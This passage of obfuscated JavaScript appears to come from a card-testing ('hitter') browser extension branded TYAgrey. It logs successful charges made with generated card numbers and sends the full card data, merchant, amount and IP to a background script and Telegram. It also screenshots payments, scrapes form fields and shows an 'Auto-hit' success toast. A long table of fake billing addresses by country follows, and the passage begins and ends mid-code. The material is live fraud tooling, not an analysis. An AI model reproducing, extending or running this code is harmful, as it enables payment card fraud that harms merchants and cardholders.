      const _0x485db3 = window.generatedCardFull || window.generatedCard || "";
      const _0x43f81a = _0x485db3 ? String(_0x485db3).replace(/\D/g, "").slice(0, 12) : "";
      if (_0x43f81a && _0x43f81a.length >= 6) {
        const _0x38df8b = (() => {
          if (extractedPaymentData.businessUrl) {
            try {
              return new URL(extractedPaymentData.businessUrl).hostname;
            } catch (_0x166a37) {
              return extractedPaymentData.businessUrl;
            }
          } else if (extractedPaymentData.successUrl) {
            try {
              return new URL(extractedPaymentData.successUrl).hostname;
            } catch (_0x1c51d0) {}
          }
          return window.location.hostname;
        })();
        if (typeof sendToBackground === "function") {
          sendToBackground({
            type: "RECORD_BIN_DATA",
            binData: {
              bin: _0x43f81a,
              merchantSite: _0x38df8b,
              amount: extractedPaymentData.amount || "0",
              currency: extractedPaymentData.currency || "usd",
              timestamp: new Date().toISOString(),
              cardInfo: _0x485db3
            }
          });
        }
      }
    } catch (_0x59f78b) {
      console.error("[TYAgrey][BIN Data] Failed to record BIN data:", _0x59f78b);
    }
    try {
      const _0x134ee4 = window.generatedCardFull || window.generatedCard || "Unknown";
      if (typeof sendToBackground === "function") {
        sendToBackground({
          type: "UPDATE_LOCAL_STATS",
          payload: {
            hit: true,
            historyEntry: {
              time: new Date().toLocaleString(),
              site: (() => {
                if (extractedPaymentData.businessUrl) {
                  try {
                    return new URL(extractedPaymentData.businessUrl).hostname;
                  } catch (_0x3a5046) {
                    return extractedPaymentData.businessUrl;
                  }
                } else if (extractedPaymentData.successUrl) {
                  try {
                    return new URL(extractedPaymentData.successUrl).hostname;
                  } catch (_0x590439) {}
                }
                return window.location.hostname;
              })(),
              card: _0x134ee4,
              amount: extractedPaymentData.amount || "0",
              currency: extractedPaymentData.currency || "usd",
              site_url: extractedPaymentData.successUrl || extractedPaymentData.businessUrl || window.location.href || ""
            }
          }
        });
      }
    } catch (_0x7fe685) {}
    try {
      if (window.generatedCardFull) {
        const _0x34c5bf = window.generatedCardFull.split("|");
        addToHistory(_0x34c5bf[0], _0x34c5bf[1], _0x34c5bf[2], _0x34c5bf[3], "SUCCESS");
      } else if (window.generatedCard) {
        addToHistory(window.generatedCard, "??", "??", "???", "SUCCESS");
      } else {
        addToHistory("Unknown", "??", "??", "???", "SUCCESS");
      }
    } catch (_0x3f6552) {}
    try {
      showSuccessToast(attemptCount, _0xab4869);
    } catch (_0x6a7014) {}
    try {
      createColorBallDrop();
    } catch (_0x164356) {}
    try {
      const _0x46289c = document.getElementById("tya-bin-input");
      const _0x1383be = document.getElementById("tya-cc-textarea");
      const _0x3b72f4 = document.getElementById("tya-detail-card");
      if (_0x46289c) {
        _0x46289c.style.filter = "blur(6px)";
        _0x46289c.dataset.ssBlurred = "1";
      }
      if (_0x1383be) {
        _0x1383be.style.filter = "blur(6px)";
        _0x1383be.dataset.ssBlurred = "1";
      }
      if (_0x3b72f4) {
        _0x3b72f4.style.filter = "blur(6px)";
        _0x3b72f4.dataset.ssBlurred = "1";
      }
      setTimeout(() => {
        if (_0x46289c && _0x46289c.dataset.ssBlurred) {
          _0x46289c.style.filter = "";
          delete _0x46289c.dataset.ssBlurred;
        }
        if (_0x1383be && _0x1383be.dataset.ssBlurred) {
          _0x1383be.style.filter = "";
          delete _0x1383be.dataset.ssBlurred;
        }
        if (_0x3b72f4 && _0x3b72f4.dataset.ssBlurred) {
          _0x3b72f4.style.filter = "";
          delete _0x3b72f4.dataset.ssBlurred;
        }
      }, 3000);
    } catch (_0x325d84) {}
    try {
      autoDownloadPaymentScreenshot();
    } catch (_0x5f5bde) {}
    try {
      const _0x3b0415 = "cardGeneratorHit_" + window.location.href;
      localStorage.setItem(_0x3b0415, "true");
    } catch (_0x448ebe) {}
    try {
      window.postMessage({
        type: "PLAY_SUCCESS_SOUND",
        volume: soundVolume
      }, "*");
    } catch (_0x9c5e95) {}
    if (!extractedPaymentData.ip && !currentDisplayIp) {
      try {
        await fetchRealIp();
      } catch (_0x5816c1) {}
    }
    extractedPaymentData.ip = currentDisplayIp || extractedPaymentData.ip || "";
    try {
      if (!extractedPaymentData.businessUrl) {
        if (extractedPaymentData.successUrl) {
          try {
            extractedPaymentData.businessUrl = new URL(extractedPaymentData.successUrl).origin;
          } catch (_0x46434d) {
            extractedPaymentData.businessUrl = window.location.hostname || window.location.origin;
          }
        } else {
          extractedPaymentData.businessUrl = window.location.hostname || window.location.origin;
        }
      }
      if (!extractedPaymentData.successUrl) {
        extractedPaymentData.successUrl = window.location.href;
      }
    } catch (_0xf26697) {}
    try {
      const _0x205ffc = scrapeExtraFormFields();
      Object.assign(extractedPaymentData, _0x205ffc);
    } catch (_0x40f391) {}
    if (attemptCount === 0 || attemptCount === undefined || attemptCount === null) {
      attemptCount = attemptCount || 0;
      attemptCount++;
    }
    const _0x257141 = {
      type: "SEND_TELEGRAM_NOTIFICATION",
      data: {
        ...extractedPaymentData,
        cardNumber: window.generatedCardFull || window.generatedCard || "",
        bin: getSelectedBIN() || "",
        tgForwardEnabled: tgForwardEnabled,
        userId: userId || savedId || "",
        userChatId: userChatId || "",
        userName: customName || userFirstName || "",
        userRole: userRole || "user",
        attempt: attemptCount || 1,
        timeTaken: _0xab4869
      }
    };
    let _0x13d85a = false;
    try {
      window.postMessage(_0x257141, "*");
      _0x13d85a = true;
      console.log("[TYAgrey][Notify] Telegram notification posted via window.postMessage");
    } catch (_0x154353) {
      console.error("[TYAgrey][Notify] Failed to post notification:", _0x154353);
    }
    if (!_0x13d85a) {
      setTimeout(() => {
        try {
          window.postMessage(_0x257141, "*");
          console.log("[TYAgrey][Notify] Telegram notification retry sent");
        } catch (_0x533bc7) {
          console.error("[TYAgrey][Notify] Retry also failed:", _0x533bc7);
        }
      }, 500);
    }
    try {
      const _0x25e731 = localStorage.getItem(K.TOKEN) || "";
      if (window.generatedCardFull) {
        await Promise.race([recordHit(_0x25e731, {
          fullCard: window.generatedCardFull,
          amount: extractedPaymentData.amount || "0",
          currency: extractedPaymentData.currency || "usd",
          siteUrl: extractedPaymentData.successUrl || extractedPaymentData.businessUrl || window.location.href || "",
          merchant: extractedPaymentData.businessUrl || (() => {
            if (extractedPaymentData.successUrl) {
              try {
                return new URL(extractedPaymentData.successUrl).hostname;
              } catch (_0x570892) {}
            }
            return window.location.hostname;
          })()
        }), new Promise(_0x3673a4 => setTimeout(() => _0x3673a4({
          timeout: true
        }), 5000))]);
      }
    } catch (_0x31ed93) {}
    try {
      if (!extractedPaymentData.businessUrl) {
        if (extractedPaymentData.successUrl) {
          try {
            extractedPaymentData.businessUrl = new URL(extractedPaymentData.successUrl).origin;
          } catch (_0xe0ac45) {
            extractedPaymentData.businessUrl = window.location.hostname || window.location.origin;
          }
        } else {
          extractedPaymentData.businessUrl = window.location.hostname || window.location.origin;
        }
      }
      if (!extractedPaymentData.successUrl) {
        extractedPaymentData.successUrl = window.location.href;
      }
    } catch (_0x1baee0) {}
    hasNotified = true;
    hasHit = true;
  }
  function autoDownloadPaymentScreenshot() {
    window.postMessage({
      type: "CAPTURE_SCREENSHOT_REQUEST"
    }, "*");
  }
  function showSuccessToast(_0x33a00c, _0x1ab124) {
    const _0x54a27d = document.querySelector(".success-toast");
    if (_0x54a27d) {
      _0x54a27d.remove();
    }
    const _0x1e0b0e = new Date();
    let _0xa30979 = _0x1e0b0e.getHours();
    const _0x1b5933 = String(_0x1e0b0e.getMinutes()).padStart(2, "0");
    const _0x2bb458 = _0xa30979 >= 12 ? "PM" : "AM";
    _0xa30979 = _0xa30979 % 12;
    _0xa30979 = _0xa30979 ? _0xa30979 : 12;
    const _0x564084 = String(_0xa30979).padStart(2, "0") + ":" + _0x1b5933 + " " + _0x2bb458;
    const _0x131000 = String(_0x1e0b0e.getDate()).padStart(2, "0");
    const _0x34aa59 = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
    const _0x329360 = _0x34aa59[_0x1e0b0e.getMonth()];
    const _0x3be643 = _0x1e0b0e.getFullYear();
    const _0x3eb8eb = _0x329360 + " " + _0x131000 + ", " + _0x3be643;
    const _0x3a5545 = document.createElement("div");
    _0x3a5545.className = "success-toast";
    _0x3a5545.innerHTML = "\n    <div class=\"success-toast-inner\">\n      <div class=\"success-toast-header\">\n        <div class=\"success-toast-brand\">TYAgrey Hitter</div>\n      </div>\n      <div class=\"success-toast-body\">\n        <div class=\"success-toast-left\">\n          <div class=\"success-toast-check\">\n            <svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" fill=\"none\"><circle cx=\"16\" cy=\"16\" r=\"16\" fill=\"#22c55e\"/><path d=\"M10 16l4 4 8-8\" stroke=\"#fff\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>\n          </div>\n          <div class=\"success-toast-info\">\n            <div class=\"success-toast-title\">Payment Successful</div>\n            <div class=\"success-toast-subtitle\">Charge processed &#8226; Auto-hit</div>\n          </div>\n        </div>\n        <div class=\"success-toast-datetime-right\">\n          <div class=\"success-toast-time\">" + _0x564084 + "</div>\n          <div class=\"success-toast-date\">" + _0x3eb8eb + "</div>\n        </div>\n      </div>\n      <div class=\"success-toast-bar\"></div>\n    </div>\n  ";
    document.body.appendChild(_0x3a5545);
    requestAnimationFrame(() => _0x3a5545.classList.add("show"));
    setTimeout(() => {
      _0x3a5545.classList.remove("show");
      setTimeout(() => _0x3a5545.remove(), 500);
    }, 4500);
  }
  function createColorBallDrop() {
    const _0xd19014 = document.createElement("div");
    _0xd19014.className = "color-ball-container";
    document.body.appendChild(_0xd19014);
    function _0x396345() {
      const _0x47e3c3 = document.createElement("div");
      const _0x4cce1a = "ball-pos-" + Math.floor(Math.random() * 20) * 5;
      const _0x35773c = "ball-size-" + ["sm", "md", "lg"][Math.floor(Math.random() * 3)];
      const _0x35168f = "ball-color-" + Math.floor(Math.random() * 8);
      const _0x57bf5f = "ball-delay-" + Math.floor(Math.random() * 10);
      const _0x3a7a0e = "ball-dur-" + Math.floor(Math.random() * 3);
      _0x47e3c3.className = "color-ball " + _0x4cce1a + " " + _0x35773c + " " + _0x35168f + " " + _0x57bf5f + " " + _0x3a7a0e;
      _0xd19014.appendChild(_0x47e3c3);
      setTimeout(() => _0x47e3c3.remove(), 6000);
    }
    for (let _0x2fd5fd = 0; _0x2fd5fd < 50; _0x2fd5fd++) {
      _0x396345();
    }
    const _0xaee54b = setInterval(() => {
      if (!document.body.contains(_0xd19014)) {
        clearInterval(_0xaee54b);
        return;
      }
      for (let _0x39718a = 0; _0x39718a < 10; _0x39718a++) {
        _0x396345();
      }
    }, 500);
  }
  const randomNames = ["tyagrey"];
  const randomHumanNames = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Daniel", "Matthew", "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth", "Nancy", "Betty", "Margaret", "Sandra", "Ashley", "Dorothy", "Tyaberly", "Emily", "Donna", "Michelle", "Alex", "Chris", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn", "Avery", "Cameron"];
  const randomStreets = ["Main Street", "Oak Road", "Park Avenue", "Maple Drive", "Cedar Lane", "Pine Street", "Lake Drive", "Forest Avenue", "River Road", "Hill Street"];
  const countryAddressData = {
    US: {
      streets: ["Main Street", "Oak Road", "Park Avenue", "Maple Drive", "Cedar Lane", "Pine Street", "Lake Drive", "Forest Avenue", "River Road", "Hill Street"],
      locations: [{
        zip: "10001",
        city: "New York"
      }, {
        zip: "10016",
        city: "New York"
      }, {
        zip: "10036",
        city: "New York"
      }, {
        zip: "02101",
        city: "Boston"
      }, {
        zip: "02108",
        city: "Boston"
      }, {
        zip: "02115",
        city: "Boston"
      }, {
        zip: "60601",
        city: "Chicago"
      }, {
        zip: "60602",
        city: "Chicago"
      }, {
        zip: "60614",
        city: "Chicago"
      }, {
        zip: "90001",
        city: "Los Angeles"
      }, {
        zip: "90015",
        city: "Los Angeles"
      }, {
        zip: "90028",
        city: "Los Angeles"
      }, {
        zip: "94102",
        city: "San Francisco"
      }, {
        zip: "94105",
        city: "San Francisco"
      }, {
        zip: "94107",
        city: "San Francisco"
      }, {
        zip: "20001",
        city: "Washington"
      }, {
        zip: "20003",
        city: "Washington"
      }, {
        zip: "20009",
        city: "Washington"
      }, {
        zip: "30301",
        city: "Atlanta"
      }, {
        zip: "30303",
        city: "Atlanta"
      }, {
        zip: "30308",
        city: "Atlanta"
      }, {
        zip: "33101",
        city: "Miami"
      }, {
        zip: "33109",
        city: "Miami"
      }, {
        zip: "33125",
        city: "Miami"
      }, {
        zip: "75201",
        city: "Dallas"
      }, {
        zip: "75202",
        city: "Dallas"
      }, {
        zip: "75219",
        city: "Dallas"
      }, {
        zip: "98101",
        city: "Seattle"
      }, {
        zip: "98104",
        city: "Seattle"
      }, {
        zip: "98109",
        city: "Seattle"
      }, {
        zip: "85001",
        city: "Phoenix"
      }, {
        zip: "85003",
        city: "Phoenix"
      }, {
        zip: "85008",
        city: "Phoenix"
      }, {
        zip: "19101",
        city: "Philadelphia"
      }, {
        zip: "19103",
        city: "Philadelphia"
      }, {
        zip: "19107",
        city: "Philadelphia"
      }, {
        zip: "78201",
        city: "San Antonio"
      }, {
        zip: "78205",
        city: "San Antonio"
      }, {
        zip: "78210",
        city: "San Antonio"
      }, {
        zip: "80201",
        city: "Denver"
      }, {
        zip: "80203",
        city: "Denver"
      }, {
        zip: "80205",
        city: "Denver"
      }, {
        zip: "97201",
        city: "Portland"
      }, {
        zip: "97204",
        city: "Portland"
      }, {
        zip: "97209",
        city: "Portland"
      }, {
        zip: "55101",
        city: "Saint Paul"
      }, {
        zip: "55103",
        city: "Saint Paul"
      }, {
        zip: "55105",
        city: "Saint Paul"
      }, {
        zip: "43201",
        city: "Columbus"
      }, {
        zip: "43203",
        city: "Columbus"
      }, {
        zip: "43215",
        city: "Columbus"
      }, {
        zip: "40201",
        city: "Louisville"
      }, {
        zip: "40203",
        city: "Louisville"
      }, {
        zip: "40208",
        city: "Louisville"
      }]
    },
    GB: {
      streets: ["High Street", "King Road", "Queen Street", "Church Lane", "Park Lane", "Victoria Road", "George Street", "Station Road", "Mill Lane", "London Road"],
      locations: [{
        zip: "E1 6AN",
        city: "London"
      }, {
        zip: "E1 6BB",
        city: "London"
      }, {
        zip: "SW1A 1AA",
        city: "London"
      }, {
        zip: "M1 1AA",
        city: "Manchester"
      }, {
        zip: "M2 1AA",
        city: "Manchester"
      }, {
        zip: "M3 1AA",
        city: "Manchester"
      }, {
        zip: "B1 1AA",
        city: "Birmingham"
      }, {
        zip: "B2 1AA",
        city: "Birmingham"
      }, {
        zip: "B3 1AA",
        city: "Birmingham"
      }, {
        zip: "G1 1AA",
        city: "Glasgow"
      }, {
        zip: "G2 1AA",
        city: "Glasgow"
      }, {
        zip: "G3 1AA",
        city: "Glasgow"
      }, {
        zip: "EH1 1AA",
        city: "Edinburgh"
      }, {
        zip: "EH2 1AA",
        city: "Edinburgh"
      }, {
        zip: "EH3 1AA",
        city: "Edinburgh"
      }, {
        zip: "L1 1AA",
        city: "Liverpool"
      }, {
        zip: "L2 1AA",
        city: "Liverpool"
      }, {
        zip: "L3 1AA",
        city: "Liverpool"
      }, {
        zip: "BS1 1AA",
        city: "Bristol"
      }, {
        zip: "BS2 1AA",
        city: "Bristol"
      }, {
        zip: "BS3 1AA",
        city: "Bristol"
      }, {
        zip: "LE1 1AA",
        city: "Leicester"
      }, {
        zip: "LE2 1AA",
        city: "Leicester"
      }, {
        zip: "LE3 1AA",
        city: "Leicester"
      }]
    },
    CA: {
      streets: ["Main Street", "King Street", "Queen Street", "Yonge Street", "Bay Street", "Wellington Street", "Dundas Street", "Church Street", "Park Avenue", "River Road"],
      locations: [{
        zip: "M5A 1A1",
        city: "Toronto"
      }, {
        zip: "M5B 1A1",
        city: "Toronto"
      }, {
        zip: "M5C 1A1",
        city: "Toronto"
      }, {
        zip: "H2X 1A1",
        city: "Montreal"
      }, {
        zip: "H2Y 1A1",
        city: "Montreal"
      }, {
        zip: "H2Z 1A1",
        city: "Montreal"
      }, {
        zip: "V6A 1A1",
        city: "Vancouver"
      }, {
        zip: "V6B 1A1",
        city: "Vancouver"
      }, {
        zip: "V6C 1A1",
        city: "Vancouver"
      }, {
        zip: "T5A 1A1",
        city: "Edmonton"
      }, {
        zip: "T5B 1A1",
        city: "Edmonton"
      }, {
        zip: "T5C 1A1",
        city: "Edmonton"
      }, {
        zip: "T2A 1A1",
        city: "Calgary"
      }, {
        zip: "T2B 1A1",
        city: "Calgary"
      }, {
        zip: "T2C 1A1",
        city: "Calgary"
      }, {
        zip: "K1A 1A1",
        city: "Ottawa"
      }, {
        zip: "K1B 1A1",
        city: "Ottawa"
      }, {
        zip: "K1C 1A1",
        city: "Ottawa"
      }, {
        zip: "R2A 1A1",
        city: "Winnipeg"
      }, {
        zip: "R2B 1A1",
        city: "Winnipeg"
      }, {
        zip: "R2C 1A1",
        city: "Winnipeg"
      }]
    },
    DE: {
      streets: ["Hauptstrasse", "Bahnhofstrasse", "Berliner Strasse", "Muenchner Strasse", "Schillerstrasse", "Goethestrasse", "Gartenstrasse", "Kirchstrasse", "Waldstrasse", "Bergstrasse"],
      locations: [{
        zip: "10115",
        city: "Berlin"
      }, {
        zip: "10117",
        city: "Berlin"
      }, {
        zip: "10119",
        city: "Berlin"
      }, {
        zip: "80331",
        city: "Muenchen"
      }, {
        zip: "80333",
        city: "Muenchen"
      }, {
        zip: "80335",
        city: "Muenchen"
      }, {
        zip: "20095",
        city: "Hamburg"
      }, {
        zip: "20097",
        city: "Hamburg"
      }, {
        zip: "20099",
        city: "Hamburg"
      }, {
        zip: "60311",
        city: "Frankfurt"
      }, {
        zip: "60313",
        city: "Frankfurt"
      }, {
        zip: "60315",
        city: "Frankfurt"
      }, {
        zip: "50667",
        city: "Koeln"
      }, {
        zip: "50669",
        city: "Koeln"
      }, {
        zip: "50670",
        city: "Koeln"
      }, {
        zip: "70173",
        city: "Stuttgart"
      }, {
        zip: "70175",
        city: "Stuttgart"
      }, {
        zip: "70177",
        city: "Stuttgart"
      }, {
        zip: "40210",
        city: "Duesseldorf"
      }, {
        zip: "40211",
        city: "Duesseldorf"
      }, {
        zip: "40212",
        city: "Duesseldorf"
      }]
    },
    FR: {
      streets: ["Rue de la Paix", "Avenue des Champs", "Boulevard Saint Germain", "Rue de Rivoli", "Avenue de la Republique", "Rue du Faubourg", "Boulevard Haussmann", "Rue Saint Honore", "Avenue Victor Hugo", "Rue de la Liberté"],
      locations: [{
        zip: "75001",
        city: "Paris"
      }, {
        zip: "75002",
        city: "Paris"
      }, {
        zip: "75003",
        city: "Paris"
      }, {
        zip: "13001",
        city: "Marseille"
      }, {
        zip: "13002",
        city: "Marseille"
      }, {
        zip: "13003",
        city: "Marseille"
      }, {
        zip: "69001",
        city: "Lyon"
      }, {
        zip: "69002",
        city: "Lyon"
      }, {
        zip: "69003",
        city: "Lyon"
      }, {
        zip: "31000",
        city: "Toulouse"
      }, {
        zip: "31100",
        city: "Toulouse"
      }, {
        zip: "31200",
        city: "Toulouse"
      }, {
        zip: "33000",
        city: "Bordeaux"
      }, {
        zip: "33100",
        city: "Bordeaux"
      }, {
        zip: "33200",
        city: "Bordeaux"
      }, {
        zip: "59000",
        city: "Lille"
      }, {
        zip: "59100",
        city: "Lille"
      }, {
        zip: "59200",
        city: "Lille"
      }, {
        zip: "44000",
        city: "Nantes"
      }, {
        zip: "44100",
        city: "Nantes"
      }, {
        zip: "44200",
        city: "Nantes"
      }]
    },
    AU: {
      streets: ["Collins Street", "Bourke Street", "Elizabeth Street", "King Street", "Queen Street", "George Street", "Pitt Street", "York Street", "Clarence Street", "Market Street"],
      locations: [{
        zip: "2000",
        city: "Sydney"
      }, {
        zip: "2001",
        city: "Sydney"
      }, {
        zip: "2002",
        city: "Sydney"
      }, {
        zip: "3000",
        city: "Melbourne"
      }, {
        zip: "3001",
        city: "Melbourne"
      }, {
        zip: "3002",
        city: "Melbourne"
      }, {
        zip: "4000",
        city: "Brisbane"
      }, {
        zip: "4001",
        city: "Brisbane"
      }, {
        zip: "4002",
        city: "Brisbane"
      }, {
        zip: "6000",
        city: "Perth"
      }, {
        zip: "6001",
        city: "Perth"
      }, {
        zip: "6002",
        city: "Perth"
      }, {
        zip: "5000",
        city: "Adelaide"
      }, {
        zip: "5001",
        city: "Adelaide"
      }, {
        zip: "5002",
        city: "Adelaide"
      }, {
        zip: "2600",
        city: "Canberra"
      }, {
        zip: "2601",
        city: "Canberra"
      }, {
        zip: "2602",
        city: "Canberra"
      }, {
        zip: "2000",
        city: "Gold Coast"
      }, {
        zip: "4215",
        city: "Gold Coast"
      }, {
        zip: "4216",
        city: "Gold Coast"
      }]
    },
    JP: {
      streets: ["Chuo-dori", "Sakura-dori", "Meiji-dori", "Yasukuni-dori", "Showa-dori", "Heiwa-dori", "Sakae-dori", "Nishi-dori", "Higashi-dori", "Kita-dori"],
      locations: [{
        zip: "100-0001",
        city: "Tokyo"
      }, {
        zip: "100-0002",
        city: "Tokyo"
      }, {
        zip: "100-0003",
        city: "Tokyo"
      }, {
        zip: "530-0001",
        city: "Osaka"
      }, {
        zip: "530-0002",
        city: "Osaka"
      }, {
        zip: "530-0003",
        city: "Osaka"
      }, {
        zip: "460-0001",
        city: "Nagoya"
      }, {
        zip: "460-0002",
        city: "Nagoya"
      }, {
        zip: "460-0003",
        city: "Nagoya"
      }, {
        zip: "810-0001",
        city: "Fukuoka"
      }, {
        zip: "810-0002",
        city: "Fukuoka"
      }, {
        zip: "810-0003",
        city: "Fukuoka"
      }, {
        zip: "600-0001",
        city: "Kyoto"
      }, {
        zip: "600-0002",
        city: "Kyoto"
      }, {
        zip: "600-0003",
        city: "Kyoto"
      }, {
        zip: "060-0001",
        city: "Sapporo"
      }, {
        zip: "060-0002",
        city: "Sapporo"
      }, {
        zip: "060-0003",
        city: "Sapporo"
      }]
    },
    IN: {
      streets: ["MG Road", "Station Road", "Park Street", "Church Road", "Lake Road", "Garden Road", "Market Road", "Civil Lines", "Jawahar Road", "Nehru Road"],
      locations: [{
        zip: "110001",
        city: "New Delhi"
      }, {
        zip: "110002",
        city: "New Delhi"
      }, {
        zip: "110003",
        city: "New Delhi"
      }, {
        zip: "400001",
        city: "Mumbai"
      }, {
        zip: "400002",
        city: "Mumbai"
      }, {
        zip: "400003",
        city: "Mumbai"
      }, {
        zip: "700001",
        city: "Kolkata"
      }, {
        zip: "700002",
        city: "Kolkata"
      }, {
        zip: "700003",
        city: "Kolkata"
      }, {
        zip: "600001",
        city: "Chennai"
      }, {
        zip: "600002",
        city: "Chennai"
      }, {
        zip: "600003",
        city: "Chennai"
      }, {
        zip: "500001",
        city: "Hyderabad"
      }, {
        zip: "500002",
        city: "Hyderabad"
      }, {
        zip: "500003",
        city: "Hyderabad"
      }, {
        zip: "380001",
        city: "Ahmedabad"
      }, {
        zip: "380002",
        city: "Ahmedabad"
      }, {
        zip: "380003",
        city: "Ahmedabad"
      }, {
        zip: "560001",
        city: "Bangalore"
      }, {
        zip: "560002",
        city: "Bangalore"
      }, {
        zip: "560003",
        city: "Bangalore"
      }]
    },
    BD: {
      streets: ["Road 1", "Road 2", "Road 3", "Avenue 1", "Avenue 2", "Avenue 3", "Lane 1", "Lane 2", "Lane 3", "Street 1"],
      locations: [{
        zip: "1000",
        city: "Dhaka"
      }, {
        zip: "1100",
        city: "Dhaka"
      }, {
        zip: "1200",
        city: "Dhaka"
      }, {
        zip: "3000",
        city: "Chittagong"
      }, {
        zip: "3100",
        city: "Chittagong"
      }, {
        zip: "3200",
        city: "Chittagong"
      }, {
        zip: "6000",
        city: "Rajshahi"
      }, {
        zip: "6100",
        city: "Rajshahi"
      }, {
        zip: "6200",
        city: "Rajshahi"
      }, {
        zip: "7000",
        city: "Khulna"
      }, {
        zip: "7100",
        city: "Khulna"
      }, {
        zip: "7200",
        city: "Khulna"
      }, {
        zip: "8000",
        city: "Sylhet"
      }, {
        zip: "8100",
        city: "Sylhet"
      }, {
        zip: "8200",
        city: "Sylhet"
      }, {
        zip: "2500",
        city: "Comilla"
      }, {
        zip: "2510",
        city: "Comilla"
      }, {
        zip: "2520",
        city: "Comilla"
      }]
    },
    SG: {
      streets: ["Orchard Road", "Tanjong Pagar", "Robinson Road", "Raffles Place", "Shenton Way", "Marina Boulevard", "Temple Street", "Smith Street", "New Bridge Road", "South Bridge Road"],
      locations: [{
        zip: "018956",
        city: "Singapore"
      }, {
        zip: "018955",
        city: "Singapore"
      }, {
        zip: "018954",
        city: "Singapore"
      }, {
        zip: "048582",
        city: "Singapore"
      }, {
        zip: "048583",
        city: "Singapore"
      }, {
        zip: "048584",
        city: "Singapore"
      }, {
        zip: "238801",
        city: "Singapore"
      }, {
        zip: "238802",
        city: "Singapore"
      }, {
        zip: "238803",
        city: "Singapore"
      }]
    },
    HK: {
      streets: ["Nathan Road", "Des Voeux Road", "Hennessy Road", "King's Road", "Queen's Road", "Hollywood Road", "Staunton Street", "Caine Road", "Robinson Road", "Garden Road"],
      locations: [{
        zip: "000000",
        city: "Hong Kong"
      }, {
        zip: "000001",
        city: "Hong Kong"
      }, {
        zip: "000002",
        city: "Hong Kong"
      }, {
        zip: "000003",
        city: "Kowloon"
      }, {
        zip: "000004",
        city: "Kowloon"
      }, {
        zip: "000005",
        city: "Kowloon"
      }]
    },
    NL: {
      streets: ["Hoofdstraat", "Kerkstraat", "Dorpsstraat", "Stationsstraat", "Marktstraat", "Molenstraat", "Schoolstraat", "Parkweg", "Bosweg", "Kanaalweg"],
      locations: [{
        zip: "1011",
        city: "Amsterdam"
      }, {
        zip: "1012",
        city: "Amsterdam"
      }, {
        zip: "1013",
        city: "Amsterdam"
      }, {
        zip: "3011",
        city: "Rotterdam"
      }, {
        zip: "3012",
        city: "Rotterdam"
      }, {
        zip: "3013",
        city: "Rotterdam"
      }, {
        zip: "3511",
        city: "Utrecht"
      }, {
        zip: "3512",
        city: "Utrecht"
      }, {
        zip: "3513",
        city: "Utrecht"
      }, {
        zip: "2511",
        city: "Den Haag"
      }, {
        zip: "2512",
        city: "Den Haag"
      }, {
        zip: "2513",
        city: "Den Haag"
      }, {
        zip: "5211",
        city: "Eindhoven"
      }, {
        zip: "5212",
        city: "Eindhoven"
      }, {
        zip: "5213",
        city: "Eindhoven"
      }]
    },
    SE: {
      streets: ["Storgatan", "Kyrkogatan", "Skolgatan", "Stationsgatan", "Marknadsgatan", "Kungsgatan", "Drottninggatan", "Vasagatan", "Odengatan", "Gustavsgatan"],
      locations: [{
        zip: "111 22",
        city: "Stockholm"
      }, {
        zip: "111 23",
        city: "Stockholm"
      }, {
        zip: "111 24",
        city: "Stockholm"
      }, {
        zip: "211 11",
        city: "Malmo"
      }, {
        zip: "211 12",
        city: "Malmo"
      }, {
        zip: "211 13",
        city: "Malmo"
      }, {
        zip: "411 01",
        city: "Goteborg"
      }, {
        zip: "411 02",
        city: "Goteborg"
      }, {
        zip: "411 03",
        city: "Goteborg"
      }, {
        zip: "753 10",
        city: "Uppsala"
      }, {
        zip: "753 11",
        city: "Uppsala"
      }, {
        zip: "753 12",
        city: "Uppsala"
      }]
    },
    BR: {
      streets: ["Rua Principal", "Avenida Brasil", "Rua das Flores", "Rua Sao Paulo", "Avenida Paulista", "Rua do Comercio", "Rua da Liberdade", "Avenida Rio Branco", "Rua da Paz", "Rua do Sol"],
      locations: [{
        zip: "01001-000",
        city: "Sao Paulo"
      }, {
        zip: "01002-000",
        city: "Sao Paulo"
      }, {
        zip: "01003-000",
        city: "Sao Paulo"
      }, {
        zip: "20001-000",
        city: "Rio de Janeiro"
      }, {
        zip: "20002-000",
        city: "Rio de Janeiro"
      }, {
        zip: "20003-000",
        city: "Rio de Janeiro"
      }, {
        zip: "40001-000",
        city: "Salvador"
      }, {
        zip: "40002-000",
        city: "Salvador"
      }, {
        zip: "40003-000",
        city: "Salvador"
      }, {
        zip: "30001-000",
        city: "Belo Horizonte"
      }, {
        zip: "30002-000",
        city: "Belo Horizonte"
      }, {
        zip: "30003-000",
        city: "Belo Horizonte"
      }, {
        zip: "60001-000",
        city: "Fortaleza"
      }, {
        zip: "60002-000",
        city: "Fortaleza"
      }, {
        zip: "60003-000",
        city: "Fortaleza"
      }]
    },
    IT: {
      streets: ["Via Roma", "Via Garibaldi", "Corso Italia", "Via Mazzini", "Via Cavour", "Corso Vittorio", "Via Dante", "Via Manzoni", "Corso Buenos Aires", "Via Montenapoleone"],
      locations: [{
        zip: "00100",
        city: "Roma"
      }, {
        zip: "00121",
        city: "Roma"
      }, {
        zip: "00142",
        city: "Roma"
      }, {
        zip: "20121",
        city: "Milano"
      }, {
        zip: "20122",
        city: "Milano"
      }, {
        zip: "20123",
        city: "Milano"
      }, {
        zip: "50121",
        city: "Firenze"
      }, {
        zip: "50122",
        city: "Firenze"
      }, {
        zip: "50123",
        city: "Firenze"
      }, {
        zip: "80121",
        city: "Napoli"
      }, {
        zip: "80122",
        city: "Napoli"
      }, {
        zip: "80123",
        city: "Napoli"
      }, {
        zip: "10121",
        city: "Torino"
      }, {
        zip: "10122",
        city: "Torino"
      }, {
        zip: "10123",
        city: "Torino"
      }]
    },
    ES: {
      streets: ["Calle Mayor", "Calle Gran Via", "Paseo de la Castellana", "Calle Alcala", "Calle Fuencarral", "Calle Preciados", "Calle Arenal", "Calle Mayor", "Paseo del Prado", "Calle Serrano"],
      locations: [{
        zip: "28001",
        city: "Madrid"
      }, {
        zip: "28002",
        city: "Madrid"
      }, {
        zip: "28003",
        city: "Madrid"
      }, {
        zip: "08001",
        city: "Barcelona"
      }, {
